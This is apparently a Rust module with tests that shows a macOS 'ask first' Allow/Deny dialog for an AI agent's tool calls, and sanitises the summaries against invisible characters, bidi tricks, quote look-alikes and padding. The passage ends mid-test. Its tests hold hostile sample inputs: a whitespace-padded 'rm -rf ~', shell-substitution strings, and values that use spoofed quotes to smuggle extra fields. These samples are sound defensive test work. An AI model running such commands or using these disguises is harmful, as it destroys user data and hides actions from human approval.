// Copyright (c) 2026 VitruvianSoftware
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

//! The "ask first" dialog, shown on this Mac with `osascript`.

use std::io::Read;
use std::os::unix::process::CommandExt;
use std::path::Path;
use std::process::{Child, Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc::{self, Receiver};
use std::time::{Duration, Instant};

use serde_json::Value;

use crate::proc::{kill_group, leader_state, may_kill_group_after, Leader};

pub const OSASCRIPT: &str = "/usr/bin/osascript";
pub const DEFAULT_TIMEOUT: Duration = Duration::from_secs(60);

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Answer {
    Allow,
    Deny,
}

/// How a dialog ended, for the caller that needs more than Allow/Deny (the
/// link logs which it was).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Waited {
    Allow,
    Deny,
    /// The dialog gave up, or never answered within its time.
    TimedOut,
    /// Closed by the caller through the `dismiss` flag.
    Dismissed,
}

/// How long past the dialog's own time limit we wait for osascript to exit
/// before killing it.
const GRACE: Duration = Duration::from_millis(500);
/// After the dialog process has exited, how long to wait for its last
/// output. It is normally there at once; the wait only matters on a loaded
/// machine, where a short one turns an Allow into a Deny.
const OUTPUT_WAIT: Duration = Duration::from_secs(2);

/// A dialog that is showing (or failed to start, which answers `Deny`).
pub struct PromptHandle {
    child: Option<Child>,
    output: Option<Receiver<String>>,
    deadline: Instant,
    /// How the leader is checked: `proc::leader_state`, or a test's stand-in.
    check: fn(i32) -> Leader,
}

impl PromptHandle {
    /// Waits for the person's answer, for at most the timeout plus a short
    /// grace, however the dialog process behaves. Only a clean exit whose
    /// output is exactly `button returned:Allow, gave up:false` is `Allow`;
    /// timeout, failure or anything else is `Deny`.
    pub fn wait(self) -> Answer {
        match self.wait_until(None) {
            Waited::Allow => Answer::Allow,
            Waited::Deny | Waited::TimedOut | Waited::Dismissed => Answer::Deny,
        }
    }

    /// Like [`wait`](Self::wait), but tells a timeout from a Deny, and closes
    /// the dialog (`Dismissed`, never an answer) within about 20 ms of
    /// `dismiss` being set from another thread.
    pub fn wait_or_dismiss(self, dismiss: &AtomicBool) -> Waited {
        self.wait_until(Some(dismiss))
    }

    fn wait_until(mut self, dismiss: Option<&AtomicBool>) -> Waited {
        let Some(mut child) = self.child.take() else {
            return Waited::Deny;
        };
        // Watch for the leader's exit without reaping it, so its process
        // group id cannot be reused before the group is killed. The check
        // asks again when a signal interrupts it (`proc::leader_state`).
        let pid = child.id() as i32;
        let mut ok = false;
        let mut timed_out = false;
        let mut dismissed = false;
        let mut gone = false;
        loop {
            // Checked first: a dismiss that races a click is never an answer.
            if dismiss.is_some_and(|d| d.load(Ordering::SeqCst)) {
                dismissed = true;
                break;
            }
            match (self.check)(pid) {
                Leader::Exited => {
                    ok = true;
                    break;
                }
                Leader::Running if Instant::now() < self.deadline => {
                    std::thread::sleep(Duration::from_millis(20))
                }
                Leader::Running => {
                    timed_out = true;
                    break;
                }
                // Someone else reaped it: its group id may already belong
                // to another process. No answer can be trusted either.
                Leader::Gone => {
                    gone = true;
                    break;
                }
            }
        }
        // Whatever the outcome, nothing the dialog started stays alive, as
        // long as the group id is still ours (the one rule, proc.rs).
        let held = if gone {
            Err(std::io::Error::from_raw_os_error(libc::ECHILD))
        } else {
            Ok(())
        };
        if may_kill_group_after(&held) {
            kill_group(pid, libc::SIGKILL);
        }
        let success = child.wait().map(|s| s.success()).unwrap_or(false) && ok;
        if dismissed {
            return Waited::Dismissed;
        }
        if timed_out {
            return Waited::TimedOut;
        }
        if !success {
            return Waited::Deny;
        }
        let out = self
            .output
            .take()
            .and_then(|rx| rx.recv_timeout(OUTPUT_WAIT).ok())
            .unwrap_or_default();
        if is_allow(&out) {
            Waited::Allow
        } else if out.contains("gave up:true") {
            Waited::TimedOut
        } else {
            Waited::Deny
        }
    }

    /// Closes the dialog without an answer (the call was cancelled or timed out
    /// elsewhere).
    pub fn dismiss(mut self) {
        if let Some(mut child) = self.child.take() {
            let pid = child.id() as i32;
            let held = match (self.check)(pid) {
                Leader::Gone => Err(std::io::Error::from_raw_os_error(libc::ECHILD)),
                _ => Ok(()),
            };
            if may_kill_group_after(&held) {
                kill_group(pid, libc::SIGKILL);
            }
            let _ = child.wait();
        }
    }
}

/// `osascript` prints exactly this when the person clicks Allow.
fn is_allow(out: &str) -> bool {
    out.trim() == "button returned:Allow, gave up:false"
}

pub fn ask(_tool: &str, summary: &str, timeout: Duration) -> PromptHandle {
    ask_with(Path::new(OSASCRIPT), summary, timeout)
}

/// Spawn attempts. Tests write a fake script and run it from parallel
/// threads, which can fail with "text file busy" for as long as another
/// thread's fork still holds the script's write handle (seconds, on a
/// loaded machine); production runs a binary that is not being written, so
/// one attempt.
#[cfg(test)]
const SPAWN_TRIES: u32 = 500;
#[cfg(not(test))]
const SPAWN_TRIES: u32 = 1;

/// Like [`ask`] with the `osascript` path given (tests use a fake). The script
/// is fixed; `summary` and the seconds travel as arguments, so nothing in the
/// summary can be read as script. The dialog runs in its own process group.
pub fn ask_with(osascript: &Path, summary: &str, timeout: Duration) -> PromptHandle {
    let secs = timeout.as_secs().max(1);
    ask_limited(
        osascript,
        summary,
        secs,
        Duration::from_secs(secs) + GRACE,
        leader_state,
    )
}

/// The dialog is told to give up after `secs`; we stop waiting for it
/// `hard_limit` after it starts, whatever it does. Tests shorten the limit
/// (a fake that never answers need not cost them seconds) and give the
/// leader check.
fn ask_limited(
    osascript: &Path,
    summary: &str,
    secs: u64,
    hard_limit: Duration,
    check: fn(i32) -> Leader,
) -> PromptHandle {
    let mut cmd = Command::new(osascript);
    cmd.args(["-e", "on run argv", "-e"])
        .arg(
            "display dialog (item 1 of argv) buttons {\"Deny\",\"Allow\"} \
             default button \"Deny\" giving up after (item 2 of argv as integer)",
        )
        .args(["-e", "end run", "--"])
        .arg(summary)
        .arg(secs.to_string())
        .process_group(0)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::null());
    let mut spawned = None;
    for _ in 0..SPAWN_TRIES {
        match cmd.spawn() {
            Ok(c) => {
                spawned = Some(c);
                break;
            }
            Err(e) if e.raw_os_error() == Some(26) => std::thread::sleep(Duration::from_millis(20)),
            Err(e) => {
                #[cfg(test)]
                eprintln!("test: the dialog did not start: {e}");
                let _ = e;
                break;
            }
        }
    }
    // From when the dialog is up (only a test's spawn retries come between).
    let deadline = Instant::now() + hard_limit;
    let Some(mut child) = spawned else {
        #[cfg(test)]
        eprintln!("test: no dialog after {SPAWN_TRIES} tries");
        return PromptHandle {
            child: None,
            output: None,
            deadline,
            check,
        };
    };
    let mut stdout = child.stdout.take();
    let (tx, rx) = mpsc::channel();
    // Detached: if a straggler holds the pipe open this thread ends when the
    // group is killed; nobody waits for it past the deadline.
    std::thread::spawn(move || {
        let mut s = String::new();
        if let Some(o) = stdout.as_mut() {
            let _ = o.read_to_string(&mut s);
        }
        let _ = tx.send(s);
    });
    PromptHandle {
        child: Some(child),
        output: Some(rx),
        deadline,
        check,
    }
}

const MAX_FIELD: usize = 200;
/// LEFT-TO-RIGHT ISOLATE and POP DIRECTIONAL ISOLATE.
const ISOLATE: char = '\u{2066}';
const END_ISOLATE: char = '\u{2069}';

/// Characters that look like a double quote. Shown as `\u{XXXX}` text, so
/// only a real (escaped) quote can look like one, and a value cannot seem
/// to end early and start another.
fn is_quote_look_alike(c: char) -> bool {
    matches!(
        c,
        '\u{02BA}'
            | '\u{02DD}'
            | '\u{02EE}'
            | '\u{201C}'
            | '\u{201D}'
            | '\u{201E}'
            | '\u{201F}'
            | '\u{2033}'
            | '\u{2036}'
            | '\u{275D}'
            | '\u{275E}'
            | '\u{2760}'
            | '\u{2E42}'
            | '\u{301D}'
            | '\u{301E}'
            | '\u{301F}'
            | '\u{3003}'
            | '\u{FF02}'
            | '\u{1F676}'..='\u{1F678}'
    )
}
/// Shown where the text has a line break.
const LINE_BREAK: char = '⏎';

/// Characters that show nothing or change how the text reads: controls
/// (Cc), the line and paragraph separators (Zl, Zp), and the invisible
/// formatting characters (Cf: zero-width, bidi overrides and isolates,
/// BOM, soft hyphen, tag characters).
fn is_hidden_char(c: char) -> bool {
    c.is_control()
        || matches!(c,
            '\u{00AD}' | '\u{034F}' | '\u{0600}'..='\u{0605}' | '\u{061C}' | '\u{06DD}' | '\u{070F}'
            | '\u{0890}'..='\u{0891}' | '\u{08E2}' | '\u{115F}' | '\u{1160}' | '\u{17B4}' | '\u{17B5}' | '\u{180B}'..='\u{180E}' | '\u{2800}' | '\u{3164}' | '\u{FE00}'..='\u{FE0F}' | '\u{FFA0}' | '\u{E0100}'..='\u{E01EF}' | '\u{200B}'..='\u{200F}'
            | '\u{2028}'..='\u{202E}' | '\u{2060}'..='\u{2064}' | '\u{2066}'..='\u{206F}'
            | '\u{FEFF}' | '\u{FFF9}'..='\u{FFFB}' | '\u{110BD}' | '\u{110CD}'
            | '\u{13430}'..='\u{1343F}' | '\u{1BCA0}'..='\u{1BCA3}'
            | '\u{1D173}'..='\u{1D17A}' | '\u{E0001}' | '\u{E0020}'..='\u{E007F}')
}

/// Hidden characters removed, runs of whitespace made one space (so padding
/// cannot push text out of view), then cut to 200 characters. A cut ends with
/// "…" and says how much was dropped, so it never reads as complete.
fn clean(s: &str) -> String {
    render(s, false)
}

/// Characters that look like the line-break marker (or like a return key).
/// They are shown as `\u{XXXX}` text so only a real line break shows `⏎`.
fn is_break_look_alike(c: char) -> bool {
    matches!(
        c,
        '\u{00B6}'
            | '\u{21A9}'
            | '\u{21B2}'
            | '\u{21B3}'
            | '\u{21B5}'
            | '\u{2324}'
            | '\u{23CE}'
            | '\u{240A}'
            | '\u{240D}'
            | '\u{2424}'
            | '\u{2936}'
            | '\u{2937}'
    )
}

/// Cleans `s` into display pieces; each piece is cut as a whole, so an escape
/// is never split. With `quote`, `"` and `\` are escaped (the caller wraps the
/// result in quotes).
fn pieces(s: &str, quote: bool) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let mut space = false;
    let mut after_cr = false;
    let ends_with_space = |out: &Vec<String>| out.last().is_none_or(|p| p == " ");
    for c in s.chars() {
        // A line break is a command separator or Enter: show it, never
        // blend it into a space. "\r\n" is one break. Tabs and other
        // whitespace become a single space.
        if matches!(c, '\n' | '\r' | '\u{85}' | '\u{2028}' | '\u{2029}') {
            if c == '\n' && after_cr {
                after_cr = false;
                continue;
            }
            after_cr = c == '\r';
            if !out.is_empty() && !ends_with_space(&out) {
                out.push(" ".into());
            }
            out.push(LINE_BREAK.to_string());
            space = true;
            continue;
        }
        after_cr = false;
        if c.is_whitespace() {
            space = true;
            continue;
        }
        if is_hidden_char(c) {
            continue;
        }
        if space && !out.is_empty() {
            out.push(" ".into());
        }
        space = false;
        if is_break_look_alike(c) || is_quote_look_alike(c) {
            out.push(format!("\\u{{{:X}}}", c as u32));
        } else if quote && (c == '"' || c == '\\') {
            out.push(format!("\\{c}"));
        } else {
            out.push(c.to_string());
        }
    }
    out
}

/// The display text for `s`: cleaned, cut to 200 characters (a piece that does
/// not fit whole is dropped), and with `quote` wrapped in quotes. A cut ends
/// with "… (truncated, N more characters)" after the closing quote, so it
/// never reads as complete and the note is never part of the value.
fn render(s: &str, quote: bool) -> String {
    let ps = pieces(s, quote);
    let total: usize = ps.iter().map(|p| p.chars().count()).sum();
    let mut kept = 0;
    let mut text = String::new();
    for p in &ps {
        let n = p.chars().count();
        if kept + n > MAX_FIELD {
            break;
        }
        kept += n;
        text.push_str(p);
    }
    // Each value is its own bidi isolate (LRI … PDI): right-to-left text in
    // it cannot reorder what is shown around it. The input's own isolates
    // and overrides were removed (`is_hidden_char`), so these stay paired.
    if quote {
        text = format!("\"{ISOLATE}{text}{END_ISOLATE}\"");
    }
    if kept < total {
        text.push_str(&format!("… (truncated, {} more characters)", total - kept));
    }
    text
}

/// A key argument as text; `None` when it is absent, empty or not a scalar.
fn field(v: &Value) -> Option<String> {
    let raw = match v {
        Value::String(s) => s.clone(),
        Value::Number(n) => n.to_string(),
        Value::Bool(b) => b.to_string(),
        _ => return None,
    };
    (!pieces(&raw, true).is_empty()).then(|| render(&raw, true))
}

/// Whether a key argument must be there for the summary to stand alone.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Need {
    /// Missing or not plain text: the person sees everything that was sent.
    Required,
    /// Shown when sent; if sent as something other than plain text, the
    /// person sees everything that was sent.
    Optional,
}

use Need::{Optional, Required};

/// The tools [`summary_keys`] knows, checked against the pinned
/// desktop-commander 0.3.1 schemas (`testdata/dc-0.3.1-tools.json`).
pub const SUMMARY_TOOLS: &[&str] = &[
    "read_file",
    "start_process",
    "interact_with_process",
    "read_process_output",
    "write_file",
    "edit_block",
    "move_file",
    "create_directory",
    "kill_process",
    "force_terminate",
    "write_pdf",
];

/// The arguments the dialog shows for `tool`, in order: everything that says
/// what runs or where. Names are desktop-commander 0.3.1's (dispatched by
/// exact, case-sensitive name).
pub fn summary_keys(tool: &str) -> &'static [(&'static str, Need)] {
    match tool {
        // Asks first only when `isUrl` is set (rules::ASK_FIRST_ARGS).
        "read_file" => &[("path", Required), ("isUrl", Optional)],
        // `shell` picks the program that runs `command`.
        "start_process" => &[("command", Required), ("shell", Optional)],
        "interact_with_process" => &[("pid", Required), ("input", Required)],
        "read_process_output" => &[("pid", Required)],
        // `mode` is rewrite (the default) or append.
        "write_file" => &[("path", Required), ("mode", Optional)],
        "edit_block" => &[("file_path", Required)],
        "move_file" => &[("source", Required), ("destination", Required)],
        "create_directory" => &[("path", Required)],
        "kill_process" | "force_terminate" => &[("pid", Required)],
        // `path` is the PDF read or created; `outputPath` where a changed copy goes.
        "write_pdf" => &[("path", Required), ("outputPath", Optional)],
        _ => &[],
    }
}

/// What the dialog shows: the tool name and its key arguments, each cleaned
/// and cut to 200 characters (see [`clean`]). If a required key argument is
/// missing, or any key argument is sent as something other than plain text,
/// the person sees everything that was sent instead, with a note of which,
/// so a renamed or odd argument is never approved blind.
pub fn summarize(tool: &str, args: &Value) -> String {
    let keys = summary_keys(tool);
    let mut parts = Vec::new();
    let mut problem = None;
    for (k, need) in keys {
        match (args.get(*k), need) {
            (None, Optional) => {}
            (v, _) => match v.and_then(field) {
                Some(v) => parts.push(format!("{k}={v}")),
                None => {
                    problem = Some(match (v, need) {
                        (None, _) | (_, Required) => format!("no {k}"),
                        (Some(_), Optional) => format!("odd {k}"),
                    });
                    break;
                }
            },
        }
    }
    let name = clean(tool);
    if keys.is_empty() || problem.is_some() {
        let json = serde_json::to_string(args).unwrap_or_default();
        return match problem {
            Some(p) => format!("{name} ({p}): {ISOLATE}{}{END_ISOLATE}", clean(&json)),
            None => format!("{name}: {ISOLATE}{}{END_ISOLATE}", clean(&json)),
        };
    }
    format!("{name}: {}", parts.join(", "))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::state::test_dir;
    use serde_json::json;
    use std::os::unix::fs::PermissionsExt;
    use std::path::PathBuf;

    /// A fake osascript: records argv (NUL-separated) to `argv.out`, prints
    /// `stdout`, exits with `code`.
    fn fake(name: &str, stdout: &str, code: i32) -> (PathBuf, PathBuf) {
        let dir = test_dir(name);
        std::fs::create_dir_all(&dir).unwrap();
        let out = dir.join("argv.out");
        let script = dir.join("osascript");
        std::fs::write(
            &script,
            format!(
                "#!/bin/sh\nprintf '%s\\0' \"$@\" > '{}'\necho '{}'\nexit {}\n",
                out.display(),
                stdout,
                code
            ),
        )
        .unwrap();
        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
        (script, out)
    }

    fn argv(out: &Path) -> Vec<String> {
        let raw = std::fs::read(out).unwrap();
        let mut parts: Vec<String> = raw
            .split(|b| *b == 0)
            .map(|p| String::from_utf8(p.to_vec()).unwrap())
            .collect();
        parts.pop(); // trailing empty after the last NUL
        parts
    }

    fn ask_t(script: &Path, summary: &str, timeout: Duration) -> PromptHandle {
        ask_with(script, summary, timeout)
    }

    /// The summary without its bidi isolates, which most tests are not
    /// about (`each_value_is_its_own_isolate` is).
    fn summarize(tool: &str, args: &Value) -> String {
        super::summarize(tool, args).replace(['\u{2066}', '\u{2069}'], "")
    }

    /// Final-wave deferred item 6a: a character that looks like a double
    /// quote is shown escaped, so it cannot fake the end of one value and
    /// the start of the next.
    #[test]
    fn quote_look_alikes_are_escaped() {
        for c in [
            '\u{02BA}', '\u{02DD}', '\u{201C}', '\u{201D}', '\u{201E}', '\u{201F}', '\u{2033}',
            '\u{2036}', '\u{275D}', '\u{275E}', '\u{301D}', '\u{301E}', '\u{301F}', '\u{3003}',
            '\u{FF02}',
        ] {
            let v = format!("/tmp/a{c}, destination={c}/etc");
            let m = summarize("move_file", &json!({"source": v, "destination": "~/d"}));
            assert!(!m.contains(c), "{c:?} {m}");
            assert!(m.contains(&format!("a\\u{{{:X}}}, ", c as u32)), "{m}");
        }
        // Plain text is untouched.
        let m = summarize("read_file", &json!({"path": "/tmp/it's"}));
        assert_eq!(m, "read_file: path=\"/tmp/it's\"");
    }

    /// Final-wave deferred item 6b: each value is its own bidi isolate
    /// (LRI … PDI, inside its quotes), so right-to-left text in one value
    /// cannot reorder what is shown around it. The input's own isolates
    /// and overrides are removed, so ours stay balanced.
    #[test]
    fn each_value_is_its_own_isolate() {
        let m = super::summarize(
            "move_file",
            &json!({"source": "\u{202E}abc\u{2066}", "destination": "\u{05D0}\u{05D1}"}),
        );
        assert_eq!(
            m,
            "move_file: source=\"\u{2066}abc\u{2069}\", destination=\"\u{2066}\u{05D0}\u{05D1}\u{2069}\""
        );
        // What was sent, in full, when a key argument is missing: one
        // isolate around it.
        let m = super::summarize("mystery", &json!({"k": "\u{05D0}"}));
        assert!(m.starts_with("mystery: \u{2066}") && m.ends_with('\u{2069}'), "{m:?}");
    }

    /// A dialog told to give up after 1 s that we stop waiting for after
    /// `SHORT`: the hard limit is the thing under test, not the wait.
    const SHORT: Duration = Duration::from_millis(300);

    fn ask_short(script: &Path) -> PromptHandle {
        ask_limited(script, "x", 1, SHORT, leader_state)
    }

    // Fakes that answer at once; the long limit is only so a loaded machine
    // never turns their answer into a timeout.
    fn run(script: &Path, summary: &str) -> Answer {
        ask_t(script, summary, Duration::from_secs(30)).wait()
    }

    fn script_in(name: &str, body: &str) -> (PathBuf, PathBuf) {
        let dir = test_dir(name);
        std::fs::create_dir_all(&dir).unwrap();
        let script = dir.join("osascript");
        std::fs::write(&script, format!("#!/bin/sh\n{body}\n")).unwrap();
        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
        (script, dir)
    }

    /// How long a dialog may take to end in these tests. Every fake here
    /// sleeps 30 s, so ending within 10 s still proves nothing waited for
    /// it, and a loaded machine (8 copies of this suite at once) has room.
    const BOUND: Duration = Duration::from_secs(10);

    // Generous bounds: on a loaded machine starting a shell can take
    // seconds. They only cost time when a test is failing anyway.
    fn pid_gone(pid: i32) -> bool {
        for _ in 0..200 {
            if unsafe { libc::kill(pid, 0) } != 0 {
                return true;
            }
            std::thread::sleep(Duration::from_millis(50));
        }
        false
    }

    fn read_pid(dir: &Path) -> i32 {
        // 30 s: under 8 copies of this suite at once a fake's shell has been
        // seen to take over 10 s to write its first line.
        for _ in 0..600 {
            if let Ok(t) = std::fs::read_to_string(dir.join("pid")) {
                if let Ok(p) = t.trim().parse() {
                    return p;
                }
            }
            std::thread::sleep(Duration::from_millis(50));
        }
        let ls: Vec<_> = std::fs::read_dir(dir)
            .map(|r| r.map(|e| e.unwrap().file_name()).collect())
            .unwrap_or_default();
        panic!("no pid file; {} holds {ls:?}", dir.display());
    }

    #[test]
    fn allow_only_on_an_explicit_allow() {
        let (s, _) = fake("p-allow", "button returned:Allow, gave up:false", 0);
        assert_eq!(run(&s, "x"), Answer::Allow);
        let (s, _) = fake("p-deny", "button returned:Deny, gave up:false", 0);
        assert_eq!(run(&s, "x"), Answer::Deny);
        let (s, _) = fake("p-empty", "", 0);
        assert_eq!(run(&s, "x"), Answer::Deny);
        let (s, _) = fake("p-junk", "button returned:Allowed, gave up:false", 0);
        assert_eq!(run(&s, "x"), Answer::Deny);
    }

    #[test]
    fn prompt_timeout_denies() {
        // Even if the button text says Allow, giving up means Deny.
        let (s, _) = fake("p-timeout", "button returned:Allow, gave up:true", 0);
        assert_eq!(run(&s, "x"), Answer::Deny);
        let (s, _) = fake("p-timeout2", "button returned:, gave up:true", 0);
        assert_eq!(run(&s, "x"), Answer::Deny);
    }

    #[test]
    fn prompt_failure_denies() {
        let (s, _) = fake("p-fail", "button returned:Allow, gave up:false", 1);
        assert_eq!(run(&s, "x"), Answer::Deny);
        // Cannot even start the program.
        assert_eq!(run(Path::new("/nonexistent/osascript"), "x"), Answer::Deny);
    }

    #[test]
    fn prompt_passes_summary_as_argument() {
        let (s, out) = fake("p-argv", "button returned:Allow, gave up:false", 0);
        let nasty = "rm \"a\" \\ b\nline2 ' $(x) `y`";
        ask_t(&s, nasty, Duration::from_secs(60)).wait();
        let a = argv(&out);
        assert_eq!(
            a[..6],
            [
                "-e",
                "on run argv",
                "-e",
                "display dialog (item 1 of argv) buttons {\"Deny\",\"Allow\"} default button \"Deny\" giving up after (item 2 of argv as integer)",
                "-e",
                "end run"
            ]
        );
        assert_eq!(a[6], "--");
        assert_eq!(a[7], nasty);
        assert_eq!(a[8], "60");
        assert_eq!(a.len(), 9);
        // The script text (the -e arguments) never contains the summary.
        for i in [1, 3, 5] {
            assert!(!a[i].contains("rm") && !a[i].contains("line2"), "{}", a[i]);
        }
    }

    #[test]
    fn wait_or_dismiss_closes_the_dialog_when_flagged() {
        let (script, dir) = script_in(
            "p-flag",
            "sleep 30 &\necho $! > \"$(dirname \"$0\")/pid\"\nsleep 30",
        );
        let h = ask_t(&script, "x", Duration::from_secs(60));
        let pid = read_pid(&dir);
        let flag = std::sync::Arc::new(AtomicBool::new(false));
        let f = flag.clone();
        let setter = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(100));
            f.store(true, Ordering::SeqCst);
        });
        let t = Instant::now();
        assert_eq!(h.wait_or_dismiss(&flag), Waited::Dismissed);
        assert!(t.elapsed() < BOUND, "{:?}", t.elapsed());
        assert!(pid_gone(pid), "child {pid} outlived the dismiss");
        setter.join().unwrap();
    }

    #[test]
    fn wait_or_dismiss_tells_a_timeout_from_a_deny() {
        let no = AtomicBool::new(false);
        let w = |name: &str, out: &str| {
            let (s, _) = fake(name, out, 0);
            ask_t(&s, "x", Duration::from_secs(30)).wait_or_dismiss(&no)
        };
        assert_eq!(
            w("w-allow", "button returned:Allow, gave up:false"),
            Waited::Allow
        );
        assert_eq!(
            w("w-deny", "button returned:Deny, gave up:false"),
            Waited::Deny
        );
        assert_eq!(
            w("w-gaveup", "button returned:, gave up:true"),
            Waited::TimedOut
        );
        assert_eq!(
            w("w-gaveup2", "button returned:Allow, gave up:true"),
            Waited::TimedOut
        );
        // A dialog that never answers hits the hard deadline: timed out.
        let (script, _) = script_in("w-backstop", "sleep 30");
        assert_eq!(ask_short(&script).wait_or_dismiss(&no), Waited::TimedOut);
    }

    #[test]
    fn dismiss_kills_the_dialog_and_its_child() {
        let (script, dir) = script_in(
            "p-dismiss",
            "sleep 30 &\necho $! > \"$(dirname \"$0\")/pid\"\nsleep 30",
        );
        let h = ask_t(&script, "x", Duration::from_secs(60));
        let pid = read_pid(&dir); // the child has started
        let t = Instant::now();
        h.dismiss();
        assert!(t.elapsed() < BOUND, "{:?}", t.elapsed());
        assert!(pid_gone(pid), "child {pid} outlived dismiss");
    }

    #[test]
    fn deadline_is_a_hard_limit_even_with_a_lingering_child() {
        // The fake neither exits nor gives up, and a child holds stdout.
        let (script, dir) = script_in(
            "p-hard",
            "sleep 30 &\necho $! > \"$(dirname \"$0\")/pid\"\nsleep 30",
        );
        let h = ask_short(&script);
        // The child exists before the deadline is enforced (a loaded
        // machine can take longer than the limit to start a shell).
        let pid = read_pid(&dir);
        let ans = h.wait();
        assert_eq!(ans, Answer::Deny);
        assert!(pid_gone(pid), "child outlived the deadline");
    }

    #[test]
    fn deadline_backstop_denies_a_dialog_that_never_answers() {
        let (script, _) = script_in("p-backstop", "sleep 30");
        let t = Instant::now();
        assert_eq!(ask_short(&script).wait(), Answer::Deny);
        assert!(t.elapsed() < BOUND, "{:?}", t.elapsed());
    }

    #[test]
    fn a_lingering_child_after_a_real_answer_does_not_delay_it() {
        let (script, dir) = script_in(
            "p-linger",
            "sleep 30 &\necho $! > \"$(dirname \"$0\")/pid\"\necho 'button returned:Allow, gave up:false'",
        );
        let t = Instant::now();
        assert_eq!(
            ask_t(&script, "x", Duration::from_secs(60)).wait(),
            Answer::Allow
        );
        assert!(t.elapsed() < BOUND, "{:?}", t.elapsed());
        assert!(pid_gone(read_pid(&dir)));
    }

    #[test]
    fn allow_output_must_match_exactly() {
        for out in [
            "button returned:Deny, gave up:false button returned:Allow, gave up:false",
            "xbutton returned:Allow, gave up:false",
            "button returned:Allow, gave up:false extra",
        ] {
            let (s, _) = fake("p-exact", out, 0);
            assert_eq!(run(&s, "x"), Answer::Deny, "{out}");
        }
    }

    #[test]
    fn summary_shows_key_arguments() {
        let s = |t: &str, a: Value| summarize(t, &a);
        assert!(s(
            "start_process",
            json!({"command": "ls -la", "timeout_ms": 5})
        )
        .contains("ls -la"));
        assert!(!s(
            "start_process",
            json!({"command": "ls", "timeout_ms": 5999})
        )
        .contains("5999"));
        let i = s(
            "interact_with_process",
            json!({"pid": 42, "input": "echo hi"}),
        );
        assert!(i.contains("42") && i.contains("echo hi"), "{i}");
        assert!(s(
            "write_file",
            json!({"path": "/tmp/a", "content": "SECRETBODY"})
        )
        .contains("/tmp/a"));
        assert!(!s(
            "write_file",
            json!({"path": "/tmp/a", "content": "SECRETBODY"})
        )
        .contains("SECRETBODY"));
        assert!(s(
            "edit_block",
            json!({"file_path": "/tmp/b", "old_string": "o"})
        )
        .contains("/tmp/b"));
        let m = s("move_file", json!({"source": "/a", "destination": "/b"}));
        assert!(m.contains("/a") && m.contains("/b"), "{m}");
        assert!(s("create_directory", json!({"path": "/tmp/d"})).contains("/tmp/d"));
        assert!(s("kill_process", json!({"pid": 7})).contains('7'));
        assert!(s("force_terminate", json!({"pid": 8})).contains('8'));
        let w = s(
            "write_pdf",
            json!({"path": "/tmp/i.pdf", "outputPath": "/tmp/o.pdf", "content": "z"}),
        );
        assert_eq!(
            w, "write_pdf: path=\"/tmp/i.pdf\", outputPath=\"/tmp/o.pdf\"",
            "{w}"
        );
        assert_eq!(
            s("read_process_output", json!({"pid": 9, "length": 5})),
            "read_process_output: pid=\"9\""
        );
        // Any other tool: compact JSON of the arguments.
        let o = s("mystery", json!({"a": 1, "b": "two"}));
        assert!(o.starts_with("mystery"), "{o}");
        assert!(o.contains(r#"{"a":1,"b":"two"}"#), "{o}");
    }

    #[test]
    fn summary_is_cut_and_cleaned() {
        let long = "x".repeat(500);
        let m = summarize("start_process", &json!({ "command": long }));
        assert!(m.chars().filter(|c| *c == 'x').count() == 200, "{m}");
        let m = summarize(
            "start_process",
            &json!({"command": "a\nb\tc\u{1b}[31md\u{0}e"}),
        );
        assert!(!m.chars().any(|c| c.is_control()), "{m:?}");
        // Cutting counts characters, not bytes: no panic on multi-byte text.
        let _ = summarize("start_process", &json!({"command": "é".repeat(300)}));
        // Missing or odd arguments do not panic.
        let _ = summarize("start_process", &json!(null));
        let _ = summarize("kill_process", &json!({"pid": {"x": 1}}));
    }

    #[test]
    fn summary_strips_invisible_and_format_characters() {
        let nasty = "a\u{202A}b\u{202A}c\u{202A}d\u{202D}e\u{202E}f\u{2066}g\u{2067}h\u{2068}i\u{2069}j\u{200B}k\u{200E}l\u{200F}m\u{FEFF}n\u{00AD}o\u{2060}p\u{E0041}q";
        let m = summarize("start_process", &json!({ "command": nasty }));
        assert_eq!(m, "start_process: command=\"abcdefghijklmnopq\"");
        let m = summarize("mystery", &json!({ "k": "x\u{202E}y" }));
        assert!(!m.contains('\u{202E}'), "{m:?}");
    }

    #[test]
    fn summary_collapses_whitespace_runs() {
        let m = summarize(
            "start_process",
            &json!({ "command": format!("ls{}; rm -rf ~", " ".repeat(300)) }),
        );
        assert!(m.contains("ls ; rm -rf ~"), "{m}");
    }

    #[test]
    fn truncation_is_marked() {
        let m = summarize(
            "start_process",
            &json!({ "command": format!("echo {}", "a".repeat(300)) }),
        );
        assert!(m.contains('…'), "{m}");
        assert!(m.contains("truncated"), "{m}");
        let m = summarize("mystery", &json!({ "k": "y".repeat(500) }));
        assert!(m.contains('…') && m.contains("truncated"), "{m}");
        // A field that fits is not marked.
        let m = summarize("start_process", &json!({ "command": "ls" }));
        assert!(!m.contains('…') && !m.contains("truncated"), "{m}");
        let m = summarize("start_process", &json!({ "command": "x".repeat(200) }));
